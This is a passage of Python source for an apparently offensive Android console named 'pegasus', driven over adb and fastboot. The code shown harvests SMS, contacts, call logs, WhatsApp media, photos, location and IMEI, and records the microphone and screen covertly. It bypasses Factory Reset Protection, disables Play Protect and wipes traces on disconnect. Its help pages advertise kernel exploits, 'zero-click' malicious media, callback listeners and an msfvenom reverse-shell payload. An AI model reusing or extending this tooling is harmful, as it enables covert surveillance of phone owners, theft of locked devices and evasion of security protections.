    mid_txt = "  ".join(mid)
    mid_len = sum(len(str(p)) for p in window) + 2 * (len(window) - 1)
    pad = max(2, (PAGE_WIDTH - llen - mid_len - rlen) // 2)
    return "  " + left + " " * pad + mid_txt + " " * pad + right


def pager(doc):
    title, pages = doc
    idx, total = 1, len(pages)
    while True:
        page = pages[idx - 1]
        show_logo()
        section(f"{title}  —  {page['title']}  ({idx}/{total})")
        for line in page["body"]:
            print(_fmt_line(line))
        print()
        print(_nav_footer(idx, total))
        print(Fore.BLUE + "  number = jump   n / p = next / prev   q = close" + Style.RESET_ALL)
        cmd = input(Fore.YELLOW + "  > " + Style.RESET_ALL).strip().lower()
        if cmd in ("q", "0", "back"):
            return
        if cmd in ("n", "next", ""):
            idx = min(total, idx + 1)
        elif cmd in ("p", "prev"):
            idx = max(1, idx - 1)
        elif cmd.isdigit() and 1 <= int(cmd) <= total:
            idx = int(cmd)


HELP_DOC = ("HELP", [
    {"title": "what this is", "body": [
        "A host-side console for one Android target, over adb and fastboot.",
        "",
        "- licence gate: SHA-256 hash, constant-time compare, cached token",
        "- tool resolution walks PATH, SDK roots, env vars and package managers, validates by banner",
        "- every capture, report and flash lands under ~/pegasus_out",
        "- transport is host<->device p2p: USB or adbd mutual TLS on the local segment",
        "- kernel LPE engine, zero-click media, callback listeners and trace wiping are built in",
        "",
        "Nothing is uploaded anywhere. The session folder is the whole product.",
    ]},
    {"title": "transports", "body": [
        "Anything that yields a shell gets tried, in order:",
        "|usb -> adbh/hdc -> mDNS pairing -> mdns connect -> subnet /24 scan (alt ports)",
        "",
        "- pairing retried up to 3 times, code cached in ~/.pegasus/paircode",
        "- option 82 bridges USB to tcp-ip by restarting adbd with service.adb.tcp.port",
        "- failed pair endpoints are also tried with a plain connect (adbd-TLS path)",
        "- option 60 prints a pairing QR you can scan from Wireless debugging",
    ]},
    {"title": "exploit ops", "body": [
        "Options 77-84 hold the offensive side:",
        "",
        "- 77 correlates uname -r and sdk against the CVE table (DirtyPipe, overlayfs,",
        "  nf_tables, binder races, run-as confusion), builds and verifies a DirtyPipe PoC",
        "- 78 pushes a stsc-corrupted MP4 and fires the media scanner - parsed with no tap;",
        "  logcat is watched for the mediaextractor surface",
        "- 79 callback listener: raw TCP or HTTP beacon, beacons logged to callbacks.jsonl",
        "- 80 wipes traces on demand; quitting or Ctrl+C wipes unless --keep-logs",
        "- 81 guided FRP workflows: usb, qr (5-tap camera join), talkback, emergency, root, auto",
        "- 82 USB to TCP/IP adbd bridge",
        "- 83 embedded INFEROR stage - decode, inspect and run (host side; needs inferor.b85)",
        "- 84 calendar harvest, 52 harvests everything including it",
    ]},
    {"title": "write ladder", "body": [
        "Settings writes try, in order:",
        "|adb root -> su -c -> cmd settings -> content insert/update",
        "",
        "- winning mode caches in ~/.pegasus/writemode",
        "- a failed write re-escalates once and retries automatically",
        "- missing rows get an insert, existing rows an update, duplicates collapse",
        "- --write-mode root|shell forces a mode, 7 clears the cache",
    ]},
    {"title": "payload builders", "body": [
        "63 MP4, 64 GIF and 62 WASM stages are built with strict validators:",
        "",
        "- MP4: ftyp/uuid/moov/mdat with avcC - box-walked on build",
        "- GIF: GIF89a + comment extension carrying the payload marker, then a shell tail",
        "- WASM: header, section LEBs and trailing-byte check before push",
        "- a stage that fails its own validator never touches the device",
    ]},
    {"title": "menu map", "body": [
        "1-9 connect and shell, 10-12 recon, 13-19 capture, 20-28 files and packages.",
        "29-33 power, 34-38 fastboot, 39-44 input, 45-52 data and harvest.",
        "53-56 privilege, FRP and Play Protect, 57-61 tunnelling and pairing.",
        "62-65 staging, 66-68 observation, 69-74 more fastboot, 75 help, 76 troubleshooting.",
        "77-84 exploit, bridge, embedded stage and calendar ops.",
    ]},
])

TROUBLE_DOC = ("TROUBLESHOOTING", [
    {"title": "adb will not install", "body": [
        "Symptom: resolution reports nothing and every install path fails.",
        "",
        "- a proxy or firewall can block dl.google.com; download platform-tools by hand and drop the folder next to this script",
        "- winget needs App Installer; apt/dnf/pacman need sudo (they are invoked with it)",
        "- on macOS brew installs without sudo",
        "- verify: adb version must print 'Android Debug Bridge'",
    ]},
    {"title": "device unauthorized", "body": [
        "Symptom: the serial shows unauthorized and every shell call fails.",
        "",
        "- accept the RSA prompt on the phone, ticking always allow",
        "- pairing retried 3x automatically, then reconnect, server restart and key regeneration fire",
        "- revoke USB debugging authorisations and replug if the prompt never appears",
        "- deleting ~/.android/adbkey{,.pub} forces a fresh prompt (done by option 4 cycle)",
    ]},
    {"title": "wireless connect fails", "body": [
        "Symptom: connect reports closed on 5555.",
        "",
        "- wireless debugging rotates ports; check the port shown on the device screen",
        "- alt ports 5555/5556/5585/5557 probed automatically",
        "- use option 82: bridge USB to tcp-ip, then connect to the printed IP",
        "- if mDNS is blocked, pair explicitly with option 59 using the pairing port and code",
    ]},
    {"title": "fastboot sees nothing", "body": [
        "Symptom: option 34 returns an empty list.",
        "",
        "- fastboot only works in the bootloader, not in a booted system",
        "- use option 32, or hold volume-down while powering on",
        "- Windows needs the Google USB driver or a generic ADB driver bound",
        "- a charge-only cable will never enumerate",
    ]},
    {"title": "flash succeeds but will not boot", "body": [
        "Symptom: bootloop after a patched image.",
        "",
        "- verity still enforcing: run 38",
        "- wrong partition: init_boot on Android 13+, boot on older builds",
        "- wrong slot: check 72 for current-slot before flashing",
        "- recover by flashing stock for the same build, or fastboot boot the stock boot",
    ]},
    {"title": "kernel exploit misses", "body": [
        "Symptom: option 77 correlates a CVE but the PoC does not land.",
        "",
        "- vendor backports shift ranges; patch level matters more than uname -r",
        "- DirtyPipe needs no privileges; binder races need uptime - run 77 again tomorrow",
        "- run-as route (CVE-2024-0044 class) only works on debuggable builds",
        "- no on-device compiler: cross-compile dirty.c, push the binary, rerun",
    ]},
    {"title": "embedded stage", "body": [
        "Symptom: option 83 reports the sidecar missing.",
        "",
        "- the INFEROR blob is host-side Python: paste it into inferor.b85 next to this script",
        "- it is b85 (reversed) -> zlib -> marshal; the validator refuses anything else",
        "- it can never run on the device itself - no Python interpreter on Android",
    ]},
])


def f_help():
    pager(HELP_DOC)


def f_trouble():
    pager(TROUBLE_DOC)


# ---------------------------------------------------------------------
#  1-9  connection layer
# ---------------------------------------------------------------------
ALT_PORTS = (5555, 5556, 5585, 5557)


def f_connect():
    section("CONNECT")
    host = input("  host [192.168.1.50]: ").strip() or "192.168.1.50"
    port = input("  port [5555]: ").strip() or "5555"
    global DEVICE
    endpoint = f"{host}:{port}"
    if _connect(endpoint):
        DEVICE = endpoint
        STATE_DIR.mkdir(parents=True, exist_ok=True)
        TARGET_FILE.write_text(DEVICE, encoding="utf-8")
        ok(f"connected {DEVICE}")
        preflight()
    else:
        err(f"connect failed on {endpoint}")


def f_list():
    section("DEVICES")
    rows = devices()
    if not rows:
        warn("no devices")
        return
    for serial, state in rows:
        (ok if state == "device" else warn)(f"{serial}  {state}")


def f_disconnect():
    section("DISCONNECT ALL WIRELESS")
    if DEVICE:
        _wipe_traces()
    adb("disconnect")
    ok("wireless links dropped - target traces wiped first")


def f_kill_server():
    section("KILL ADB SERVER")
    if DEVICE:
        _wipe_traces()
    adb("kill-server")
    ok("server stopped - next command restarts it")


def f_scan():
    section("SCAN /24 FOR ADB (ALT PORTS)")
    base = input("  subnet base [192.168.1]: ").strip() or "192.168.1"
    base = re.sub(r"\.0$", "", re.sub(r"/\d+$", "", base.strip())).rstrip(".")
    note(f"probing {base}.1-254 on {', '.join(str(p) for p in ALT_PORTS)}")
    hits = _subnet_scan(base)
    if not hits:
        warn("nothing open")
        return
    for hit in hits:
        ok(hit)
    if input("  connect to first hit? [Y/n]: ").strip().lower() != "n":
        global DEVICE
        if _connect(hits[0]):
            DEVICE = hits[0]
            TARGET_FILE.parent.mkdir(parents=True, exist_ok=True)
            TARGET_FILE.write_text(DEVICE, encoding="utf-8")
            ok(f"connected {DEVICE}")
            preflight()


def f_reconnect():
    section("RECONNECT CACHED")
    try:
        peers = [p for p in PEER_FILE.read_text(encoding="utf-8").split() if p]
    except OSError:
        peers = []
    try:
        cached = TARGET_FILE.read_text(encoding="utf-8").strip()
        if cached and cached not in peers:
            peers.insert(0, cached)
    except OSError:
        pass
    if not peers:
        err("nothing cached - connect once first")
        return
    global DEVICE
    for endpoint in peers:
        if _connect(endpoint):
            DEVICE = endpoint
            ok(f"target {endpoint}")
            preflight()
            return
        warn(f"{endpoint} unreachable")
    err("all cached endpoints dead")


def f_forget():
    section("FORGET CACHED")
    removed = 0
    for path in (TARGET_FILE, PEER_FILE, PENDING_FILE, VERITY_FILE):
        try:
            path.unlink()
            removed += 1
        except OSError:
            pass
    (ok if removed else warn)("state cleared" if removed else "nothing cached")


def f_shell():
    section("INTERACTIVE SHELL")
    if not need():
        return
    os.system(f'"{ADB}" -s {DEVICE} shell' if IS_WIN
              else f'{ADB} -s {DEVICE} shell')


def f_oneshot():
    section("ONE-SHOT COMMAND")
    if not need():
        return
    cmd = input("  command: ").strip()
    if not cmd:
        return
    rc, out, e = shell(cmd)
    print(out or e)


# ---------------------------------------------------------------------
#  10-12  recon
# ---------------------------------------------------------------------
def f_info():
    section("DEVICE INFO")
    if not need():
        return
    keys = ("ro.product.manufacturer", "ro.product.model", "ro.product.device",
            "ro.build.version.release", "ro.build.version.sdk", "ro.build.fingerprint",
            "ro.build.type", "ro.debuggable", "ro.secure", "ro.serialno")
    lines = []
    for key in keys:
        lines.append(f"{key}: {shell(f'getprop {key}')[1].strip() or '-'}")
    lines.append(f"kernel: {shell('uname -r')[1].strip() or '-'}")
    lines.append(f"security patch: "
                 f"{shell('getprop ro.build.version.security_patch')[1].strip() or '-'}")
    lines.append(f"wm size: {shell('wm size')[1].strip() or '-'}")
    lines.append(f"wm density: {shell('wm density')[1].strip() or '-'}")
    lines.append(f"uptime: {shell('cat /proc/uptime')[1].strip() or '-'}")
    lines.append(f"storage: {shell('df -h /data')[1].strip() or '-'}")
    for line in lines:
        print("  " + line)
    save("device_info", "\n".join(lines))


def f_battery():
    section("BATTERY")
    if not need():
        return
    out = shell("dumpsys battery")[1]
    print(out)
    save("battery", out)


def f_identity():
    section("IMEI / CARRIER / LOCATION")
    if not need():
        return
    chunks = []
    for label, cmd in (
        ("imei", "service call iphonesubinfo 1"),
        ("sim operator", "getprop gsm.sim.operator.alpha"),
        ("network operator", "getprop gsm.operator.alpha"),
        ("location", "dumpsys location | head -n 25"),
        ("android id", "settings get secure android_id"),
    ):
        out = shell(cmd)[1].strip()
        chunks.append(f"--- {label} ---\n{out or '-'}")
    print("\n".join(chunks))
    save("identity", "\n\n".join(chunks))


# ---------------------------------------------------------------------
#  13-19  capture and playback
# ---------------------------------------------------------------------
def f_screenshot():
    section("SCREENSHOT")
    if not need():
        return
    dest = stamp("shot", "png")
    data = _screenshot_bytes()
    if not data:
        err("capture failed (exec-out and shell fallback both)")
        return
    dest.write_bytes(data)
    ok(f"saved -> {dest}")


def f_record_screen():
    section("RECORD SCREEN")
    if not need():
        return
    secs = input("  seconds [20]: ").strip() or "20"
    remote = "/sdcard/pegasus_rec.mp4"
    with Progress("recording", int(secs)) as bar:
        rc, _, e = shell(f"screenrecord --bit-rate 6000000 --time-limit {secs} {remote}",
                         timeout=int(secs) + 30)
        bar.finish()
    if rc != 0:
        err(e.strip()[:160])
        return
    pull(remote, stamp("screen", "mp4"))
    shell(f"rm -f {remote}")


def f_record_mic():
    section("RECORD MIC")
    if not need():
        return
    secs = input("  seconds [15]: ").strip() or "15"
    remote = "/sdcard/pegasus_mic.m4a"
    rc, _, e = shell(
        f"termux-microphone-record -f {remote} -l {secs} -e aac -b 128000 -r 44100 -c 1",
        timeout=int(secs) + 30)
    if rc != 0:
        warn("termux-microphone-record unavailable on target")
        note("install Termux on the device for mic capture")
        return
    with Progress("recording", int(secs)) as bar:
        for _ in range(int(secs)):
            time.sleep(1)
            bar.step()
    shell("termux-microphone-record -q")
    pull(remote, stamp("mic", "m4a"))


def f_mirror():
    section("MIRROR (SCRCPY)")
    if not need():
        return
    binary = shutil.which("scrcpy")
    if not binary:
        err("scrcpy not installed")
        note("winget install Genymobile.scrcpy  /  apt install scrcpy")
        return
    subprocess.run([binary, "-s", DEVICE])


def _view(local: Path, remote: str, mime: str):
    if not push(local, remote):
        return
    shell(f'am start -a android.intent.action.VIEW -d "file://{remote}" -t {mime}')


def f_show_image():
    section("SHOW IMAGE ON DEVICE")
    if not need():
        return
    src = _ask_file("  local image path: ")
    if src:
        _view(src, f"/sdcard/Download/{src.name}", "image/*")


def f_play_audio():
    section("PLAY AUDIO ON DEVICE")
    if not need():
        return
    src = _ask_file("  local audio path: ")
    if src:
        _view(src, f"/sdcard/Music/{src.name}", "audio/*")


def f_play_video():
    section("PLAY VIDEO ON DEVICE")
    if not need():
        return
    src = _ask_file("  local video path: ")
    if src:
        _view(src, f"/sdcard/Movies/{src.name}", "video/*")


# ---------------------------------------------------------------------
#  20-28  filesystem and packages
# ---------------------------------------------------------------------
def f_pull():
    section("PULL FILE")
    if not need():
        return
    remote = input("  remote path: ").strip()
    if remote:
        pull(remote, stamp(Path(remote).name or "file", "bin"))


def f_push():
    section("PUSH FILE")
    if not need():
        return
    src = _ask_file("  local path: ")
    remote = input("  remote dir [/sdcard/Download]: ").strip() or "/sdcard/Download"
    if src:
        push(src, f"{remote.rstrip('/')}/{src.name}")


def f_ls():
    section("LIST DIRECTORY")
    if not need():
        return
    path = input("  path [/sdcard]: ").strip() or "/sdcard"
    print(shell(f"ls -la {path}")[1])


def f_delete():
    section("DELETE PATH")
    if not need():
        return
    path = input("  remote path: ").strip()
    if path and input(f"  rm -rf {path}? [Y/n]: ").strip().lower() != "n":
        rc, _, e = shell(f"rm -rf {path}")
        (ok if rc == 0 else err)(e.strip()[:120] or f"removed {path}")


def f_third_party():
    section("THIRD-PARTY PACKAGES")
    if not need():
        return
    out = shell("pm list packages -3 -f")[1]
    lines = sorted(l for l in out.splitlines() if l.strip())
    for line in lines:
        print("  " + line)
    save("third_party_apps", "\n".join(lines))


def f_launch():
    section("LAUNCH APP")
    if not need():
        return
    pkg = input("  package: ").strip()
    if pkg:
        rc, out, e = shell(f"monkey -p {pkg} -c android.intent.category.LAUNCHER 1")
        (ok if rc == 0 else err)((out + e).strip().splitlines()[-1][:120]
                                 if (out + e).strip() else pkg)


def f_install():
    section("INSTALL APK")
    if not need():
        return
    src = _ask_file("  local apk: ")
    if not src:
        return
    as_root = input("  install as root (/data/app) ? [y/N]: ").strip().lower() == "y"
    if as_root and _device_root():
        remote = f"/data/local/tmp/{src.name}"
        if push(src, remote):
            rc, out, e = shell(f"pm install -r -g {remote}", timeout=600)
            shell(f"rm -f {remote}")
    else:
        if as_root:
            warn("no root - using normal install")
        rc, out, e = adb("install", "-r", "-g", str(src), timeout=600)
    (ok if rc == 0 else err)((out + e).strip()[:200])


def f_uninstall():
    section("UNINSTALL PACKAGE")
    if not need():
        return
    pkg = input("  package: ").strip()
    if pkg:
        rc, out, e = adb("uninstall", pkg, timeout=180)
        (ok if rc == 0 else err)((out + e).strip()[:160])


def f_extract_apk():
    section("EXTRACT APK")
    if not need():
        return
    pkg = input("  package: ").strip()
    if not pkg:
        return
    out = shell(f"pm path {pkg}")[1]
    paths = [l.split(":", 1)[1].strip() for l in out.splitlines() if l.startswith("package:")]
    if not paths:
        err("package not found")
        return
    for path in paths:
        pull(path, stamp(pkg, "apk"))


# ---------------------------------------------------------------------
#  29-33  power
# ---------------------------------------------------------------------
def f_reboot():
    section("REBOOT")
    if need() and input("  reboot now? [Y/n]: ").strip().lower() != "n":
        adb("reboot")
        ok("reboot sent")


def f_poweroff():
    section("POWER OFF")
    if need() and input("  power off? [Y/n]: ").strip().lower() != "n":
        shell("reboot -p")
        ok("power off sent")


def f_keyevent():
    section("SEND KEYEVENT")
    if not need():
        return
    code = input("  keycode [3=HOME 4=BACK 26=POWER]: ").strip() or "3"
    shell(f"input keyevent {code}")
    ok(f"keyevent {code}")


def f_reboot_bootloader():
    section("REBOOT TO BOOTLOADER")
    if not need():
        return
    adb("reboot", "bootloader")
    ok("rebooting to bootloader")
    with Progress("waiting", 8) as bar:
        for _ in range(8):
            time.sleep(1)
            bar.step()
            if FB and (fb("devices")[1] or "").strip():
                ok("fastboot device visible")
                return
    warn("still not visible - check the cable and driver")


def f_reboot_recovery():
    section("REBOOT TO RECOVERY")
    if not need():
        return
    adb("reboot", "recovery")
    ok("rebooting to recovery")


# ---------------------------------------------------------------------
#  34-38  fastboot core
# ---------------------------------------------------------------------
def f_fb_devices():
    section("FASTBOOT DEVICES")
    rc, out, e = fb("devices")
    if rc != 0:
        err(e.strip()[:140] or "fastboot unavailable")
        return
    rows = [l for l in out.splitlines() if l.strip()]
    if not rows:
        warn("none in fastboot mode - use option 32")
        return
    for row in rows:
        ok(row.strip())


def f_fb_getvar():
    section("FASTBOOT GETVAR ALL")
    if not need_fb():
        return
    rc, out, e = fb("getvar", "all", timeout=180)
    blob = (out + e).strip()
    if not blob:
        warn("nothing returned")
        return
    print(blob[:4000])
    save("fastboot_vars", blob)
    for key in ("unlocked", "secure", "current-slot", "unlock_ability"):
        for line in blob.splitlines():
            if key in line:
                (ok if "yes" in line.lower() or "true" in line.lower() else warn)(line.strip())
                break


def f_fb_unlock():
    section("UNLOCK BOOTLOADER")
    if not need_fb():
        return
    warn("unlocking wipes userdata and may void warranty")
    if input("  proceed? [y/N]: ").strip().lower() != "y":
        return
    verbs = [("flashing unlock", ("flashing", "unlock")),
             ("oem unlock", ("oem", "unlock")),
             ("flashing unlock_critical", ("flashing", "unlock_critical")),
             ("oem unlock-go", ("oem", "unlock-go"))]
    with Progress("unlock verbs", len(verbs)) as bar:
        for label, args in verbs:
            rc, out, e = fb(*args, timeout=120)
            blob = (out + e).lower()
            bar.step(label[:20])
            if "okay" in blob or "success" in blob:
                ok(f"{label} accepted")
                break
            note(f"{label} -> {(out + e).strip()[:60] or 'no output'}")
    rc, out, e = fb("flashing", "get_unlock_ability")
    note((out + e).strip()[:80] or "unlock_ability unknown")
    note("confirm on the device with the volume keys, then 34 to verify")


def f_fb_flash_boot():
    section("FLASH PATCHED BOOT (MAGISK)")
    if not need_fb():
        return
    partition = input("  partition [init_boot / boot / recovery]: ").strip() or "init_boot"
    if partition not in ("init_boot", "boot", "recovery"):
        err("pick init_boot, boot or recovery")
        return
    src = _ask_file("  patched image path: ")
    if not src:
        return
    slot = ""
    rc, out, e = fb("getvar", "current-slot")
    for line in (out + e).splitlines():
        if "current-slot" in line and ":" in line:
            slot = line.split(":")[-1].strip()
    if slot:
        note(f"current slot: {slot}")
    note(f"about to flash {src.name} -> {partition}")
    if input("  confirm? [y/N]: ").strip().lower() != "y":
        return
    with Progress(f"flash {partition}", 3) as bar:
        rc, out, e = fb("flash", partition, str(src), timeout=600)
        bar.step("written")
        blob = (out + e).lower()
        if "okay" in blob or "finished" in blob:
            ok(f"{partition} flashed")
        else:
            err((out + e).strip()[:180])
            return
        rc, out, e = fb("getvar", "slot-count")
        bar.step("vars")
        rc, out, e = fb("reboot")
        bar.step("reboot")
    ok("device rebooting - first boot after a patch takes longer")


def f_fb_vbmeta():
    section("DISABLE VERITY (VBMETA)")
    if not need_fb():
        return
    warn("disables verity and verification; a stock vbmeta image is safest")
    src = _ask_file("  vbmeta image path (blank = use stock from device): ")
    args = ["--disable-verity", "--disable-verification", "flash", "vbmeta"]
    if src:
        args.append(str(src))
    if input("  proceed? [y/N]: ").strip().lower() != "y":
        return
    with Progress("vbmeta", 1) as bar:
        rc, out, e = fb(*args, timeout=300)
        bar.step()
    blob = (out + e).lower()
    if "okay" in blob or "finished" in blob:
        ok("verity disabled in vbmeta")
        note("reboot, then adb root / adb remount will work")
    else:
        err((out + e).strip()[:180])
        note("some devices need an explicit vbmeta partition image")


# ---------------------------------------------------------------------
#  39-44  input
# ---------------------------------------------------------------------
def f_tap():
    section("TAP")
    if not need():
        return
    try:
        x, y = (int(v) for v in input("  x y: ").split())
    except ValueError:
        err("need two integers")
        return
    shell(f"input tap {x} {y}")
    ok(f"tap {x},{y}")


def f_swipe():
    section("SWIPE")
    if not need():
        return
    try:
        vals = [int(v) for v in input("  x1 y1 x2 y2 [ms]: ").split()]
    except ValueError:
        err("need integers")
        return
    if len(vals) == 5:
        shell(f"input swipe {vals[0]} {vals[1]} {vals[2]} {vals[3]} {vals[4]}")
    elif len(vals) == 4:
        shell(f"input swipe {vals[0]} {vals[1]} {vals[2]} {vals[3]}")
    else:
        err("need 4 or 5 values")
        return
    ok("swipe sent")


def f_type():
    section("TYPE TEXT")
    if not need():
        return
    text = input("  text: ")
    if text:
        shell(f'input text "{text_escape(text)}"')
        ok("typed")


def f_unlock():
    section("UNLOCK DEVICE")
    if not need():
        return
    shell("input keyevent 224")
    time.sleep(0.4)
    shell("input swipe 540 1800 540 600 200")
    shell("input keyevent 82")
    ok("wake + swipe + menu sent")
    note("a PIN still has to be typed with option 41")


def f_lock():
    section("LOCK DEVICE")
    if need():
        shell("input keyevent 26")
        ok("power key sent")


def f_url():
    section("OPEN URL")
    if not need():
        return
    url = input("  url: ").strip()
    if url:
        shell(f'am start -a android.intent.action.VIEW -d "{url}"')
        ok("opened")


# ---------------------------------------------------------------------
#  45-52  data harvesting
# ---------------------------------------------------------------------
def f_send_sms():
    section("SEND SMS")
    if not need():
        return
    number = input("  number: ").strip()
    body = input("  body: ").strip()
    if number:
        shell(f'am start -a android.intent.action.SENDTO -d "sms:{number}" '
              f'--es sms_body "{body}"')
        ok("composer opened - confirm on device")


def _query(name: str, uri: str):
    section(name.upper())
    if not need():
        return
    rc, out, e = shell(f"content query --uri {uri}", timeout=180)
    if rc != 0 or not out.strip():
        err((e or "empty result").strip()[:160])
        note("content query usually needs root on the target")
        return
    ok(f"{out.count('Row:')} row(s)")
    save(name.lower().replace(" ", "_"), out)


def f_dump_sms():
    _query("dump sms", "content://sms")


def f_dump_contacts():
    _query("dump contacts", "content://com.android.contacts/data/phones")


def f_dump_calls():
    _query("dump call log", "content://call_log/calls")


def f_calendar():
    _query("dump calendar", "content://com.android.calendar/events")


def _pull_tree(remote: str, label: str):
    rc, out, _ = shell(f"ls {remote}")
    if rc != 0 or not out.strip():
        warn(f"{remote} empty or absent")
        return
    pull(remote, SESSION / label)


def f_whatsapp():
    section("WHATSAPP MEDIA")
    if not need():
        return
    for path in ("/sdcard/Android/media/com.whatsapp/WhatsApp/Media",
                 "/sdcard/WhatsApp/Media"):
        _pull_tree(path, "whatsapp")
    save("whatsapp_paths", "see pulled tree")


def f_screenshots():
    section("SCREENSHOTS")
    if need():
        _pull_tree("/sdcard/DCIM/Screenshots", "screenshots")
        _pull_tree("/sdcard/Pictures/Screenshots", "screenshots2")


def f_camera_photos():
    section("CAMERA PHOTOS")
    if need():
        _pull_tree("/sdcard/DCIM/Camera", "camera")


def f_harvest():
    section("HARVEST ALL")
    if not need():
        return
    note(f"session folder: {SESSION}")
    steps = (f_info, f_battery, f_identity, f_dump_sms, f_dump_contacts,
             f_dump_calls, f_calendar, f_third_party, f_whatsapp,
             f_screenshots, f_camera_photos)
    with Progress("harvest", len(steps)) as bar:
        for step in steps:
            try:
                step()
            except Exception as exc:               # noqa: BLE001
                err(f"{step.__name__}: {exc}")
            bar.step(step.__name__[2:])
    ok("harvest complete")


# ---------------------------------------------------------------------
#  53-56  privilege, FRP, Play Protect
# ---------------------------------------------------------------------
def f_privesc():
    section("PRIVILEGE ASSESSMENT")
    if not need():
        return
    findings = []

    def probe(label, cmd, good=""):
        out = shell(cmd)[1].strip() or "-"
        findings.append((label, out, bool(good) and good in out))
        return out

    probe("id", "id")
    probe("uid", "id -u")
    probe("kernel", "uname -r")
    probe("run-as route", 'run-as com.android.shell sh -c "id"', "uid=")
    probe("su on path", "which su", "/")
    for path in ("/system/bin/su", "/system/xbin/su", "/sbin/su",
                 "/debug_ramdisk/su", "/data/adb/magisk"):
        probe(f"artifact {path}", f"ls -d {path} 2>/dev/null", path)
    probe("magisk modules", "ls /data/adb/modules 2>/dev/null", "/")
    probe("build tags", "getprop ro.build.tags", "test-keys")
    probe("debuggable", "getprop ro.debuggable", "1")
    probe("secure", "getprop ro.secure", "0")
    probe("selinux", "getenforce", "Permissive")
    probe("verity", "getprop ro.boot.veritymode", "disabled")

    uid_out = shell("su -c id -u")[1].strip()
    findings.append(("su -c id -u", uid_out or "-", uid_out == "0"))

    setuid = []
    out = shell("ls -la /system/bin /system/xbin /vendor/bin 2>/dev/null")[1]
    for line in out.splitlines():
        if line.startswith("-rws") or line.startswith("---s"):
            setuid.append(line.split()[-1])
    findings.append(("setuid binaries", str(len(setuid)), bool(setuid)))

    mode = _ensure_write_access(force=True)
    findings.append(("write mode", mode, mode == "root"))
    writable = _probe_write()
    findings.append(("probe write", "ok" if writable else "refused", writable))

    print()
    for label, value, good in findings:
        (ok if good else warn)(f"{label}: {value[:70]}")
    if setuid:
        print()
        for entry in setuid[:20]:
            note(entry)

    if uid_out == "0":
        verdict = "root shell confirmed - kernel LPE not required"
    elif writable:
        verdict = "no root, but settings accept writes - 55/56 will land"
    else:
        verdict = "settings locked - consider option 77 (kernel exploit engine)"
    save("privesc", "\n".join(f"{l}: {v}" for l, v, _ in findings) + f"\nverdict: {verdict}")
    (ok if uid_out == "0" or writable else warn)(verdict)


def f_frp():
    section("FRP WORKFLOW")
    if not need():
        return
    chunks = []
    for label, cmd in (
        ("frp service", "dumpsys frp"),
        ("frp partition", "getprop ro.frp.pst"),
        ("setup complete", "settings get secure user_setup_complete"),
        ("device provisioned", "settings get global device_provisioned"),
        ("accounts", "dumpsys account | head -n 40"),
        ("google packages", "pm list packages | grep -i google | head -n 20"),
    ):
        out = shell(cmd)[1].strip() or "-"
        chunks.append(f"--- {label} ---\n{out}")
        note(f"{label}: {(out.splitlines() or ['-'])[0][:70]}")
    setup = shell("settings get secure user_setup_complete")[1].strip()
    if setup == "1":
        ok("already provisioned - option 55 clears the account link")
    else:
        warn("setup incomplete - option 55 finishes provisioning")
    note("option 81 runs the guided workflows; FRP survives a factory reset")
    save("frp_state", "\n\n".join(chunks))


def _frp_body() -> str:
    return "\n".join([
        "set -u",
        "w() { ns=$1; k=$2; v=$3;",
        "  su -c \"settings put $ns $k $v\" 2>/dev/null;",
        "  [ \"$(settings get $ns $k)\" = \"$v\" ] && return 0;",
        "  cmd settings put $ns $k $v 2>/dev/null;",
        "  [ \"$(settings get $ns $k)\" = \"$v\" ] && return 0;",
        "  content insert --uri content://settings/$ns --bind name:s:$k --bind value:s:$v 2>/dev/null;",
        "  [ \"$(settings get $ns $k)\" = \"$v\" ] && return 0;",
        "  content update --uri content://settings/$ns --bind value:s:$v --where \"name='$k'\" 2>/dev/null;",
        "}",
        "w global device_provisioned 1",
        "w secure user_setup_complete 1",
        "w secure tv_user_setup_complete 1",
        "w global verifier_verify_adb_installs 0",
        "pm disable-user --user 0 com.google.android.gms 2>/dev/null;",
        "pm enable com.google.android.gms 2>/dev/null",
        "su -c 'pm clear com.google.android.gms' 2>/dev/null || pm clear com.google.android.gms",
        "am start -a com.google.android.setupwizard.SETUP_WIZARD_FINISHED 2>/dev/null",
        "am force-stop com.google.android.setupwizard 2>/dev/null",
        "echo done",
    ]) + "\n"


def f_frp_chain():
    section("FRP QUICK CHAIN")
    if not need():
        return
    mode = _ensure_write_access(force=True)
    note(f"write mode: {mode}")
    steps = [
        ("provisioned", "global", "device_provisioned", "1"),
        ("setup complete", "secure", "user_setup_complete", "1"),
        ("tv setup flag (wear/TV relics)", "secure", "tv_user_setup_complete", "1"),
        ("adb verifier", "global", "verifier_verify_adb_installs", "0"),
    ]
    hits = 0
    with Progress("frp chain", len(steps) + 2) as bar:
        for label, namespace, key, value in steps:
            if _setting_write(namespace, key, value):
                hits += 1
            else:
                warn(f"{label} failed on every path")
            bar.step(label[:20])
        if _clear_package("com.google.android.gms"):
            hits += 1
        bar.step("clear gms")
        shell("am start -a com.google.android.setupwizard.SETUP_WIZARD_FINISHED")
        bar.step("wizard")
    setup = _readback("secure", "user_setup_complete")
    prov = _readback("global", "device_provisioned")
    good = setup == "1" and prov == "1"
    save("frp_chain", f"{hits}/{len(steps) + 2} steps landed, mode={mode}, "
                     f"verify={'PASS' if good else 'FAIL'}")
    _persist_script("pegasus_frp", _frp_body())
    if good:
        ok("chain complete and verified")
    else:
        warn("partial chain - queued script retries on next connect")
    if _device_root():
        note("root extras: wiping persisted FRP state")
        for cmd in ("rm -rf /persist/frp/* 2>/dev/null",
                    "rm -f /efs/factoryapp/frp 2>/dev/null",
                    "setprop persist.sys.frp.state 0 2>/dev/null"):
            shell(cmd)
        ok("root FRP extras swept")


def f_playprotect():
    section("DEFEAT PLAY PROTECT")
    if not need():
        return
    mode = _ensure_write_access(force=True)
    note(f"write mode: {mode}")
    keys = [
        ("global", "package_verifier_enable", "0"),
        ("secure", "package_verifier_user_consent", "-1"),
        ("global", "verifier_verify_adb_installs", "0"),
    ]
    hits = 0
    with Progress("verifier keys", len(keys)) as bar:
        for ns, key, value in keys:
            if _setting_write(ns, key, value):
                hits += 1
            bar.step(key[:20])
    save("playprotect", f"{hits}/{len(keys)} landed, mode={mode}")
    _persist_script("pegasus_playprotect",
                    "\n".join(f"settings put {ns} {k} {v}" for ns, k, v in keys)
                    + "\necho done\n")
    if hits == len(keys):
        ok("all three keys applied - sideloads will not be scanned")
    else:
        warn("partial - queued script retries on next connect")


# ---------------------------------------------------------------------
#  57-61  staging and pairing
# ---------------------------------------------------------------------
def f_metasploit():
    section("METASPLOIT")
    if not need():
        return
    if not shutil.which("msfvenom"):
        err("msfvenom not on PATH")
        note("msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -o p.apk")
        return
